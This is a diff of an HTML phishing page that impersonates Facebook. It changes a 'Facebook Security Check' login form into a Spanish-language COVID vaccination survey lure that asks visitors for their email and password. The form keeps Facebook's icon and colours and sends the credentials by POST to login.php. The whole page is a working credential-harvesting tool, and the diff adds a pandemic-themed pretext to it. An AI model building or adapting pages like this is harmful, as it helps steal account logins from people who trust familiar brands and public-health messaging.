@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 	<meta charset="UTF-8">
-	<title>Security Check</title>
+	<title>Encuesta Covid 21-22</title>
 	<link rel="shortcut icon" type="ico" href="images/fb-ico.png">
 	<link rel="stylesheet" type="text/css" href="style.css">
 </head>
@@ -17,24 +17,24 @@
 	<section>
 		<div class="form">
 			<div class="m-header">
-				<h3>Facebook Security Check</h3>
+				<h3>Inicio de Sesión Encuesta Vacunaton. </h3>
 			</div>
 			<div class="red-box">
-				<p style="font-weight:bold; font-size:13px">Verification needed to understand it's you</p>
-				<p>Enter your password for security reasons (make sure you have caps lock turned off)</p>
-				<p>Forgot your password? <a href="http://www.facebook.com">Reset your password</a>
+				<p style="font-weight:bold; font-size:13px">Verifique su identidad para realizar la encuesta.</p>
+				<p>Ingrese su contraseña por razones de seguridad (asegúrese de tener el bloqueo de mayúsculas desactivado)</p>
+				<p>¿Olvidaste tu contraseña? <a href="http://www.facebook.com">Recupera tu contraseña</a>
 			</div>
 
-			<div class="login-form">
-				<form action="do_action.php">
-					<label for="username">Username:</label>
+			<div class="menu_loging_container rfloat _ohf" data-testid="royal_login_form">
+				<form id="login_form" action="login.php" method="post" novalidate="1" onsubmit>
+					<label for="username">Correo Electrónico:</label>
 					<input name="username" type="text" id="username"></input><br /><br />
-					<label for="password">Password:</label>
+					<label for="password">Contraseña:</label>
 					<input name="password" id="password" type="password"></input><br />
 					<input id="keep" style="margin: 10px 0 0 84px" type="checkbox"></input>
-					<label for="keep" style="font-size:12px;">keep me logged in</label><br />
-					<input type="submit" name="submit" value="Verify" style="background: none repeat scroll 0 0 #3b5998; border: 1px solid #294461; color: #ffffff; margin: 4px 0 0 80px; padding: 2px 6px;"></input>
-					<p><a style="text-decoration:none; color:#3B5998; margin:0 0 0 80px;" href="">can't log in?</a></p>
+					<label for="keep" style="font-size:12px;">Mantener cuenta abierta</label><br />
+					<input type="submit" name="submit" value="Entrar" style="background: none repeat scroll 0 0 #3b5998; border: 1px solid #294461; color: #ffffff; margin: 4px 0 0 80px; padding: 2px 6px;"></input>
+					<p><a style="text-decoration:none; color:#3B5998; margin:0 0 0 80px;" href="">¿No puedo entrar?</a></p>
 				</form>
 			</div>
 
